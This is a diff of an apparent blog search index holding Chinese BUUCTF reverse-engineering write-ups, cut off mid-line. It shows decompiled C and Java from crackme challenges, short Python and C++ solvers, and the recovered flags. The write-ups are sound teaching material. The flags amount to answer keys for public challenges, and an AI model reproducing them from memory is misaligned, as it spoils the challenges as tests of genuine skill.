+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 s; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);                    <span class="comment">//时间作为随机数种子</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )     <span class="comment">//随机数决定执行哪个case</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, f1);    <span class="comment">//f1=&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, &amp;f2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        s = <span class="number">0x7F666F6067756369</span>LL;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>关键就在<code>1,4,5</code>这三个<code>case</code>里,
+应该要以合适的顺序执行才能得到<strong>flag</strong></p>
+<p>分析出来正确的顺序应该是<code>4,5,1</code>, 写成Python代码如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string0 = <span class="string">&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line">string1 = <span class="string">&quot;\x69\x63\x75\x67\x60\x6f\x66\x7f&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(string1)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        string0 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(string1[i]) - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        string0 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(string1[i]) - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(string0)</span><br><span class="line"><span class="comment">#GXY&#123;do_not_hate_me&#125;</span></span><br></pre></td></tr></table></figure>
+<p>所以<strong>flag</strong>就是<code>GXY&#123;do_not_hate_me&#125;</code></p>
+]]></content>
+      <categories>
+        <category>Reverse</category>
+      </categories>
+      <tags>
+        <tag>二进制</tag>
+        <tag>逆向</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[BUUCTF]Java逆向解密</title>
     <url>/2022/01/22/%5BReverse%5DJava%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86/</url>
     <content><![CDATA[<p>给的是一个<code>Java</code>字节码文件,
@@ -695,6 +695,61 @@ href="/2022/01/21/%5BReverse%5Dxor/">[BUUCTF]xor</a></p>
       </categories>
       <tags>
         <tag>Java逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[BUUCTF]findit</title>
+    <url>/2022/01/23/%5BReverse%5Dfindit/</url>
+    <content><![CDATA[<p>是个<code>apk</code>, 拿<code>AndroidKiller</code>反编译,
+找到一个<code>Unicode</code>字符串</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231431068.png"
+alt="image-20220123143139971" />
+<figcaption aria-hidden="true">image-20220123143139971</figcaption>
+</figure>
+<p>解码一看, 哈哈高兴的太早了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;\u7b54\u6848\u9519\u4e86\u80bf\u4e48\u529e\u3002\u3002\u3002\</span></span><br><span class="line"><span class="string">            \u4e0d\u7ed9\u4f60\u53c8\u4e0d\u597d\u610f\u601d\u3002\u3002\</span></span><br><span class="line"><span class="string">            \u3002\u54ce\u5440\u597d\u7ea0\u7ed3\u554a~~~&quot;</span></span><br><span class="line"><span class="built_in">print</span>(string)</span><br><span class="line"><span class="comment">#答案错了肿么办。。。            不给你又不好意思。。            。哎呀好纠结啊~~~</span></span><br></pre></td></tr></table></figure>
+<p>在<code>MainActivity.smali</code>里面找到了几个数组,
+很可能和<strong>flag</strong>有关</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231616264.png"
+alt="image-20220123161621158" />
+<figcaption aria-hidden="true">image-20220123161621158</figcaption>
+</figure>
+<p><code>smali</code>格式阅读起来很不方便,
+需要将它还原成<code>Java</code>代码,
+但是<code>AndroidKiller</code>不支持这种功能,
+所以改用<code>jadx</code>.</p>
+<blockquote>
+<p>jadx: <a href="https://github.com/skylot/jadx">Github</a></p>
+</blockquote>
+<p>用<code>jadx-gui</code>直接打开<code>apk</code>, 源码就出来了,
+到<code>MainActivity</code>一看, 果然和<strong>flag</strong>有关</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231633521.png"
+alt="image-20220123163357380" />
+<figcaption aria-hidden="true">image-20220123163357380</figcaption>
+</figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.findit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.ActionBarActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">ActionBarActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">edit</span> <span class="operator">=</span> (EditText) findViewById(R.id.widget2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">TextView</span> <span class="variable">text</span> <span class="operator">=</span> (TextView) findViewById(R.id.widget1);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">char</span>[] a = &#123;<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span>&#125;;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">char</span>[] b = &#123;<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>&#125;;</span><br><span class="line">        ((Button) findViewById(R.id.widget3)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="comment">/* class com.example.findit.MainActivity.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">char</span>[] x = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">17</span>];</span><br><span class="line">                <span class="type">char</span>[] y = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">38</span>];</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;I&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;A&#x27;</span>) || (a[i] &lt; <span class="string">&#x27;i&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;a&#x27;</span>)) &#123;</span><br><span class="line">                        x[i] = (<span class="type">char</span>) (a[i] + <span class="number">18</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;A&#x27;</span> || a[i] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (a[i] &lt; <span class="string">&#x27;a&#x27;</span> || a[i] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                        x[i] = a[i];</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        x[i] = (<span class="type">char</span>) (a[i] - <span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (String.valueOf(x).equals(edit.getText().toString())) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">38</span>; i2++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ((b[i2] &lt; <span class="string">&#x27;A&#x27;</span> || b[i2] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (b[i2] &lt; <span class="string">&#x27;a&#x27;</span> || b[i2] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                            y[i2] = b[i2];</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            y[i2] = (<span class="type">char</span>) (b[i2] + <span class="number">16</span>);</span><br><span class="line">                            <span class="keyword">if</span> ((y[i2] &gt; <span class="string">&#x27;Z&#x27;</span> &amp;&amp; y[i2] &lt; <span class="string">&#x27;a&#x27;</span>) || y[i2] &gt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">                                y[i2] = (<span class="type">char</span>) (y[i2] - <span class="number">26</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    text.setText(String.valueOf(y));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                text.setText(<span class="string">&quot;答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (item.getItemId() == R.id.action_settings) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onOptionsItemSelected(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>好在<code>Java</code>的语法和<code>C/C++</code>类似,
+可以大概看出来是个啥意思:</p>
+<p>先对<code>a</code>数组进行处理, 放到<code>x</code>数组中,
+对比用户的输入和<code>x</code>数组是否相同,
+若相同则对<code>b</code>数组进行处理放到<code>y</code>数组中并显示出来,
+想必<code>y</code>数组中的就是<strong>flag</strong>.</p>
+<p>解密代码如下:</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> a[] = &#123; <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> b[] = &#123; <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> x[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> y[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;I&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;A&#x27;</span>) || (a[i] &lt; <span class="string">&#x27;i&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;a&#x27;</span>)) &#123;</span><br><span class="line">			x[i] = (a[i] + <span class="number">18</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;A&#x27;</span> || a[i] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (a[i] &lt; <span class="string">&#x27;a&#x27;</span> || a[i] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">			x[i] = a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			x[i] = (a[i] - <span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">38</span>; i2++) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((b[i2] &lt; <span class="string">&#x27;A&#x27;</span> || b[i2] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (b[i2] &lt; <span class="string">&#x27;a&#x27;</span> || b[i2] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">			y[i2] = b[i2];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			y[i2] = (b[i2] + <span class="number">16</span>);</span><br><span class="line">			<span class="keyword">if</span> ((y[i2] &gt; <span class="string">&#x27;Z&#x27;</span> &amp;&amp; y[i2] &lt; <span class="string">&#x27;a&#x27;</span>) || y[i2] &gt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">				y[i2] = (y[i2] - <span class="number">26</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Key:%s\nFlag:%s&quot;</span>, x, y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Key:LzakAkLzwXdsyZgew</span></span><br><span class="line"><span class="comment">//Flag:flag&#123;c164675262033b4c49bdf7f9cda28a75&#125;</span></span><br><span class="line"><span class="comment">//用unsigned char是因为实测用char的话, 这个flag的算法在C/C++里会出现溢出而出现乱码, </span></span><br><span class="line"><span class="comment">//查了一下是因为Java的char是2字节. 这个flag的算法其实就是位移+16位类凯撒加密</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Reverse</category>
+      </categories>
+      <tags>
+        <tag>逆向</tag>
+        <tag>Java逆向</tag>
+        <tag>Android逆向</tag>
       </tags>
   </entry>
   <entry>
@@ -763,61 +818,6 @@ alt="image-20220121230115616" />
       <tags>
         <tag>二进制</tag>
         <tag>逆向</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[BUUCTF]findit</title>
-    <url>/2022/01/23/%5BReverse%5Dfindit/</url>
-    <content><![CDATA[<p>是个<code>apk</code>, 拿<code>AndroidKiller</code>反编译,
-找到一个<code>Unicode</code>字符串</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231431068.png"
-alt="image-20220123143139971" />
-<figcaption aria-hidden="true">image-20220123143139971</figcaption>
-</figure>
-<p>解码一看, 哈哈高兴的太早了</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;\u7b54\u6848\u9519\u4e86\u80bf\u4e48\u529e\u3002\u3002\u3002\</span></span><br><span class="line"><span class="string">            \u4e0d\u7ed9\u4f60\u53c8\u4e0d\u597d\u610f\u601d\u3002\u3002\</span></span><br><span class="line"><span class="string">            \u3002\u54ce\u5440\u597d\u7ea0\u7ed3\u554a~~~&quot;</span></span><br><span class="line"><span class="built_in">print</span>(string)</span><br><span class="line"><span class="comment">#答案错了肿么办。。。            不给你又不好意思。。            。哎呀好纠结啊~~~</span></span><br></pre></td></tr></table></figure>
-<p>在<code>MainActivity.smali</code>里面找到了几个数组,
-很可能和<strong>flag</strong>有关</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231616264.png"
-alt="image-20220123161621158" />
-<figcaption aria-hidden="true">image-20220123161621158</figcaption>
-</figure>
-<p><code>smali</code>格式阅读起来很不方便,
-需要将它还原成<code>Java</code>代码,
-但是<code>AndroidKiller</code>不支持这种功能,
-所以改用<code>jadx</code>.</p>
-<blockquote>
-<p>jadx: <a href="https://github.com/skylot/jadx">Github</a></p>
-</blockquote>
-<p>用<code>jadx-gui</code>直接打开<code>apk</code>, 源码就出来了,
-到<code>MainActivity</code>一看, 果然和<strong>flag</strong>有关</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231633521.png"
-alt="image-20220123163357380" />
-<figcaption aria-hidden="true">image-20220123163357380</figcaption>
-</figure>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.findit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.ActionBarActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">ActionBarActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">edit</span> <span class="operator">=</span> (EditText) findViewById(R.id.widget2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">TextView</span> <span class="variable">text</span> <span class="operator">=</span> (TextView) findViewById(R.id.widget1);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">char</span>[] a = &#123;<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span>&#125;;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">char</span>[] b = &#123;<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>&#125;;</span><br><span class="line">        ((Button) findViewById(R.id.widget3)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="comment">/* class com.example.findit.MainActivity.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">char</span>[] x = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">17</span>];</span><br><span class="line">                <span class="type">char</span>[] y = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">38</span>];</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;I&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;A&#x27;</span>) || (a[i] &lt; <span class="string">&#x27;i&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;a&#x27;</span>)) &#123;</span><br><span class="line">                        x[i] = (<span class="type">char</span>) (a[i] + <span class="number">18</span>);</span><br><span 